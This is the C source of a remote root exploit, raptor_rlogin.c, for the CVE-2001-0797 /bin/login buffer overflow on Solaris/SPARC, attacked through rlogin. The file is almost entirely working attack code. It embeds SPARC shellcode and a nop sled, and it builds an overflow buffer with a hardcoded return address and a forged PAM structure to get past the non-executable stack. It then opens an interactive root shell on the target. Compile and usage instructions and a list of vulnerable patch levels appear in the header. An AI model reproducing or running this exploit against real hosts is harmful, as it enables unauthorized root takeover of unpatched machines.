/*
 * $Id: raptor_rlogin.c,v 1.1.1.1 2004/12/04 14:35:33 raptor Exp $
 *
 * raptor_rlogin.c - (r)login, Solaris/SPARC 2.5.1/2.6/7/8
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Buffer overflow in login in various System V based operating systems 
 * allows remote attackers to execute arbitrary commands via a large number 
 * of arguments through services such as telnet and rlogin (CVE-2001-0797).
 *
 * Dedicated to my beautiful croatian ladies (hello Zrinka!) -- August 2004
 *
 * This remote root exploit uses the (old) System V based /bin/login 
 * vulnerability via the rlogin attack vector, returning into the .bss 
 * section to effectively bypass the non-executable stack protection
 * (noexec_user_stack=1 in /etc/system).
 *
 * Many thanks to scut <scut@nb.in-berlin.de> (0dd) for his elite pam_handle_t
 * technique (see 7350logout.c), also thanks to inode <inode@deadlocks.info>.
 *
 * Usage (must be root):
 * # gcc raptor_rlogin.c -o raptor_rlogin -Wall
 * [on solaris: gcc raptor_rlogin.c -o raptor_rlogin -Wall -lxnet]
 * # ./raptor_rlogin -h 192.168.0.50
 * [...]
 * # id;uname -a;uptime;
 * uid=0(root) gid=0(root)
 * SunOS merlino 5.8 Generic_108528-13 sun4u sparc SUNW,Ultra-5_10
 *   7:45pm  up 12 day(s), 18:42,  1 user,  load average: 0.00, 0.00, 0.01
 * #
 *
 * Vulnerable platforms (SPARC):
 * Solaris 2.5.1 without patch 106160-02 [untested]
 * Solaris 2.6 without patch 105665-04 [untested]
 * Solaris 7 without patch 112300-01 [untested]
 * Solaris 8 without patch 111085-02 [tested]
 */

#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define	INFO1	"raptor_rlogin.c - (r)login, Solaris/SPARC 2.5.1/2.6/7/8"
#define	INFO2	"Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	BUFSIZE	3000			// max size of the evil buffer
#define	RETADDR	0x27184			// retaddr, should be reliable
#define	TIMEOUT	10			// net_read() default timeout
#define	CMD	"id;uname -a;uptime;\n"	// executed upon exploitation

char sc[] = /* Solaris/SPARC special shellcode (courtesy of inode) */
/* execve() + exit() */
"\x94\x10\x20\x00\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc"
"\xa2\x14\x63\x68\xd4\x23\xbf\xfc\xe2\x23\xbf\xf8\xe0\x23\xbf\xf4"
"\x90\x23\xa0\x0c\xd4\x23\xbf\xf0\xd0\x23\xbf\xec\x92\x23\xa0\x14"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x82\x10\x20\x01\x91\xd0\x20\x08";

char sparc_nop[] = /* Solaris/SPARC special nop (xor %sp, %sp, %o0) */
"\x90\x1b\x80\x0e";

/* prototypes */
int	exploit_addchar(unsigned char *ww, unsigned char wc);
void	fatalerr(char *func, char *error, int fd);
int	net_connect(char *host, int port, int timeout);
int	net_read(int fd, char *buf, int size, int timeout);
int	net_resolve(char *host);
int	sc_copy(unsigned char *buf, char *str, long len);
void	set_val(char *buf, int pos, int val);
void	shell(int fd);
void	usage(char *progname);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], *p = buf;
	char	c, *host = NULL, term[] = "vt100/9600";
	int	fd, i, found, len;
	int	timeout = TIMEOUT, debug = 0;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* parse command line */
	if (argc < 2)
		usage(argv[0]);

	while ((c = getopt(argc, argv, "dh:t:")) != EOF)
		switch(c) {
		case 'h':
			host = optarg;
			break;
		case 't':
			timeout = atoi(optarg);
			break;
		case 'd':
			debug = 1;
			break;
		default:
			usage(argv[0]);
		}

	if (!host)
		usage(argv[0]);

	/* connect to the target host */
	fd = net_connect(host, 513, 10);
	fprintf(stderr, "# connected to remote host: %s\n", host);

	/* signal handling */
	signal(SIGPIPE, SIG_IGN);

	/* begin the rlogin session */
	memset(buf, 0, sizeof(buf));

	if (send(fd, buf, 1, 0) < 0)
		fatalerr("send", strerror(errno), fd);

	if (net_read(fd, buf, sizeof(buf), timeout) < 0)
		fatalerr("error", "Timeout reached in rlogin session", fd);

	/* dummy rlogin authentication */
	memcpy(p, "foo", 3);		// local login name
	p += 4;
	memcpy(p, "bar", 3);		// remote login name
	p += 4;
	memcpy(p, term, sizeof(term));	// terminal type
	p += sizeof(term);

	fprintf(stderr, "# performing dummy rlogin authentication\n");
	if (send(fd, buf, p - buf, 0) < 0)
		fatalerr("send", strerror(errno), fd);

	/* wait for password prompt */
	found = 0;
	memset(buf, 0, sizeof(buf));

	while (net_read(fd, buf, sizeof(buf), timeout)) {
		if (strstr(buf, "assword: ") != NULL) {
			found = 1;
			break;
		}
		memset(buf, 0, sizeof(buf));
	}

	if (!found)
		fatalerr("error", "Timeout waiting for password prompt", fd);

	/* send a dummy password */
	if (send(fd, "pass\n", 5, 0) < 0)
		fatalerr("send", strerror(errno), fd);

	/* wait for login prompt */
	found = 0;
	memset(buf, 0, sizeof(buf));

	fprintf(stderr, "# waiting for login prompt\n");
	while (net_read(fd, buf, sizeof(buf), timeout)) {
		if (strstr(buf, "ogin: ") != NULL) {
			found = 1;
			break;
		}
		memset(buf, 0, sizeof(buf));
	}

	if (!found)
		fatalerr("error", "Timeout waiting for login prompt", fd);

	fprintf(stderr, "# returning into 0x%08x\n", RETADDR);

	/* for debugging purposes */
	if (debug) {
		printf("# debug: press enter to continue");
		scanf("%c", &c);
	}

	/* prepare the evil buffer */
	memset(buf, 0, sizeof(buf));
	p = buf;

	/* login name */
	memcpy(p, "foo ", 4);
	p += 4;

	/* return address (env) */
	set_val(p, 0, RETADDR);
	p += 4;
	memcpy(p, " ", 1);
	p++;

	/* trigger the overflow (env) */
	for (i = 0; i < 60; i++, p += 2)
		memcpy(p, "a ", 2);

	/* padding */
	memcpy(p, " BBB", 4);
	p += 4;

	/* nop sled and shellcode */
	for (i = 0; i < 398; i++, p += 4)
		memcpy(p, sparc_nop, 4);
	p += sc_copy(p, sc, sizeof(sc) - 1);

	/* padding */
	memcpy(p, "BBB ", 4);
	p += 4;

	/* pam_handle_t: minimal header */
	memcpy(p, "CCCCCCCCCCCCCCCC", 16);
	p += 16;
	set_val(p, 0, RETADDR);	// must be a valid address
	p += 4;
	set_val(p, 0, 0x01);
	p += 4;

	/* pam_handle_t: NULL padding */
	for (i = 0; i < 52; i++, p += 4)
		set_val(p, 0, 0x00);

	/* pam_handle_t: pameptr must be the 65th ptr */
	memcpy(p, "\x00\x00\x00 AAAA\n", 9);
	p += 9;

	/* send the evil buffer, 256 chars a time */
	len = p - buf;
	p = buf;
	while (len > 0) {
		fprintf(stderr, "#");
		i = len > 0x100 ? 0x100 : len;
		send(fd, p, i, 0);
		len -= i;
		p += i;
		if (len)
			send(fd, "\x04", 1, 0);
		usleep(500000);
	}
	fprintf(stderr, "\n");
	
	/* wait for password prompt */
	found = 0;
	memset(buf, 0, sizeof(buf));

	fprintf(stderr, "# evil buffer sent, waiting for password prompt\n");
	while (net_read(fd, buf, sizeof(buf), timeout)) {
		if (strstr(buf, "assword: ") != NULL) {
			found = 1;
			break;
		}
		memset(buf, 0, sizeof(buf));
	}

	if (!found)
		fatalerr("error", "Most likely not vulnerable", fd);

	fprintf(stderr, "# password prompt received, waiting for shell\n");

	if (send(fd, "pass\n", 5, 0) < 0)
		fatalerr("send", strerror(errno), fd);

	/* wait for shell prompt */
	memset(buf, 0, sizeof(buf));
	found = 0;

	while (net_read(fd, buf, sizeof(buf), timeout)) {
		if (strstr(buf, "# ") != NULL) {
			found = 1;
			break;
		}
		memset(buf, 0, sizeof(buf));
	}

	if (!found)
		fatalerr("error", "Most likely not vulnerable", fd);

	/* connect to the remote shell */
	fprintf(stderr, "# shell prompt detected, successful exploitation\n\n");
	shell(fd);

	exit(0);
}

/*
 * exploit_addchar(): char translation for pam (ripped from scut)
 */
int exploit_addchar(unsigned char *ww, unsigned char wc)
{
	unsigned char * wwo = ww;

	switch (wc) {
	case ('\\'):
		*ww++ = '\\';
		*ww++ = '\\';
		break;
	case (0xff):
	case ('\n'):
	case (' '):
	case ('\t'):
		*ww++ = '\\';
		*ww++ = ((wc & 0300) >> 6) + '0';
		*ww++ = ((wc & 0070) >> 3) + '0';
		*ww++ = (wc & 0007) + '0';
		break;
	default:
		*ww++ = wc;
		break;
	}

	return (ww - wwo);
}

/*
 * fatalerr(): error handling routine
 */
void fatalerr(char *func, char *error, int fd)
{
	fprintf(stderr, "%s: %s\n", func, error);
	close(fd);
	exit(1);
}

/*
 * net_connect(): simple network connect with timeout
 */
int net_connect(char *host, int port, int timeout)
{
	int			fd, i, flags, sock_len;
	struct sockaddr_in	sin;
	struct timeval		tv;
	fd_set			fds;

	/* allocate a socket */
	if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		perror("socket");
		exit(1);
	}

	/* bind a privileged port (FIXME) */
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	for (i = 1023; i > 0; i--) {
		sin.sin_port = htons(i);
		if (!(bind(fd, (struct sockaddr *)&sin, sizeof(sin))))
			break;
	}
	if (i == 0)
		fatalerr("error", "Can't bind a privileged port (must be root)", fd);

	/* resolve the peer address */
	sin.sin_port = htons(port);
	if (!(sin.sin_addr.s_addr = net_resolve(host)))
		fatalerr("error", "Can't resolve hostname", fd);

	/* set non-blocking */
	if ((flags = fcntl(fd, F_GETFL, 0)) < 0)
		fatalerr("fcntl", strerror(errno), fd);
	if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0)
		fatalerr("fcntl", strerror(errno), fd);

	/* connect to remote host */
	if (!(connect(fd, (struct sockaddr *)&sin, sizeof(sin)))) {
		if (fcntl(fd, F_SETFL, flags) < 0)
			fatalerr("fcntl", strerror(errno), fd);
		return(fd);
	}
	if (errno != EINPROGRESS)
		fatalerr("error", "Can't connect to remote host", fd);

	/* set timeout */
	tv.tv_sec = timeout;
	tv.tv_usec = 0;

	/* setup select structs */
	FD_ZERO(&fds);
	FD_SET(fd, &fds);

	/* select */
	if (select(FD_SETSIZE, NULL, &fds, NULL, &tv) <= 0)
		fatalerr("error", "Can't connect to remote host", fd);
	
	/* check if connected */
	sock_len = sizeof(sin);
	if (getpeername(fd, (struct sockaddr *)&sin, &sock_len) < 0)
		fatalerr("error", "Can't connect to remote host", fd);
	if (fcntl(fd, F_SETFL, flags) < 0)
		fatalerr("fcntl", strerror(errno), fd);
	return(fd);
}

/*
 * net_read(): non-blocking read from fd
 */
int net_read(int fd, char *buf, int size, int timeout)
{
	fd_set		fds;
	struct timeval	wait;
	int		n = -1;

	/* set timeout */
	wait.tv_sec = timeout;
	wait.tv_usec = 0;

	memset(buf, 0, size);

	FD_ZERO(&fds);
	FD_SET(fd, &fds);

	/* select with timeout */
	if (select(FD_SETSIZE, &fds, NULL, NULL, &wait) < 0) {
		perror("select");
		exit(1);
	}

	/* read data if any */
	if (FD_ISSET(fd, &fds))
		n = read(fd, buf, size);

	return n;
}

/*
 * net_resolve(): simple network resolver
 */
int net_resolve(char *host)
{
	struct in_addr	addr;
	struct hostent	*he;

	memset(&addr, 0, sizeof(addr));

	if ((addr.s_addr = inet_addr(host)) == -1) {
		if (!(he = (struct hostent *)gethostbyname(host)))
			return(0);
		memcpy((char *)&addr.s_addr, he->h_addr, he->h_length);
	}
	return(addr.s_addr);
}

/*
 * sc_copy(): copy the shellcode, using exploit_addchar()
 */
int sc_copy(unsigned char *buf, char *str, long len)
{
	unsigned char	*or = buf;
	int 		i;

	for(i = 0; i < len; i++)
		buf += exploit_addchar(buf, str[i]);

	return(buf - or);
}

/*
 * set_val(): copy a dword inside a buffer
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0xff000000) >> 24;
	buf[pos + 1] =	(val & 0x00ff0000) >> 16;
	buf[pos + 2] =	(val & 0x0000ff00) >> 8;
	buf[pos + 3] =	(val & 0x000000ff);
}

/*
 * shell(): semi-interactive shell hack
 */
void shell(int fd)
{
	fd_set	fds;
	char	tmp[128];
	int	n;

	/* quote Hvar 2004 */
	fprintf(stderr, "\"Da Bog da ti se mamica nahitavala s vragom po dvoristu!\" -- Bozica (Hrvatska)\n\n");

	/* execute auto commands */
	write(1, "# ", 2);
	write(fd, CMD, strlen(CMD));

	/* semi-interactive shell */
	for (;;) {
		FD_ZERO(&fds);
		FD_SET(fd, &fds);
		FD_SET(0, &fds);

		if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) < 0) {
			perror("select");
			break;
		}

		/* read from fd and write to stdout */
		if (FD_ISSET(fd, &fds)) {
			if ((n = read(fd, tmp, sizeof(tmp))) < 0) {
				fprintf(stderr, "Goodbye...\n");
				break;
			}
			if (write(1, tmp, n) < 0) {
				perror("write");
				break;
			}
		}

		/* read from stdin and write to fd */
		if (FD_ISSET(0, &fds)) {
			if ((n = read(0, tmp, sizeof(tmp))) < 0) {
				perror("read");
				break;
			}
			if (write(fd, tmp, n) < 0) {
				perror("write");
				break;
			}
		}
	}

	close(fd);
	exit(1);
}

void usage(char *progname)
{
	fprintf(stderr, "usage: %s [-h host] [-t timeout] [-d]\n\n", progname);
	fprintf(stderr, "-h host\t\tdestination ip or fqdn\n");
	fprintf(stderr, "-t timeout\tnet_read() timeout (default: %d)\n", TIMEOUT);
	fprintf(stderr, "-d\t\tturn on debug mode\n\n");
	exit(1);
}
